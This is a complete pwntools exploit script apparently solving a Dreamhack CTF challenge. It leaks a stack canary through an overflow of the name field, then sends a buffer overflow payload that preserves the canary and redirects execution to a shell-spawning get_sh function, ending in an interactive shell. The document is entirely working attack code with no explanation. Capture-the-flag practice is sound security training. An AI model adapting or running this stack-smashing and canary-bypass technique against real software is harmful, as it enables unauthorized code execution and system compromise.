from pwn import *

r = remote("host3.dreamhack.games", 22541)

get_sh = 0x401216

r.sendafter("name: ",b'A'*56)
r.sendlineafter("age: ",b'1111111111')
r.sendlineafter("height: ",b'1111111111111111')
r.sendafter("(Female): ",b'storm')

r.recvuntil(b'storm')
cnry = r.recvn(7)
canary = u64(b'\x00' + cnry)

payload = b'A'*104
payload += p64(canary)
payload += b'B'*8
payload += p64(get_sh)

r.sendlineafter("nationality? ",payload)

r.interactive()